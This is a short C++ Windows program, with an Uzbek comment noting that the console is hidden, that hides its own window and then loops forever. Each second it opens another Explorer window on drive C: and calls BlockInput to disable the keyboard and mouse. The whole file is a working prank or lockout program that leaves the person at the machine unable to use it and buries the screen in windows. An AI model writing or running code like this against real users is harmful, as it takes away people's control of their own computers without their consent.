#include <Windows.h>

int main() {
	FreeConsole(); //console yashiriladi

	while (true) {
		system("explorer C:");
		Sleep(1000);
		BlockInput(true);
	}

	system("pause");
	return 0;
}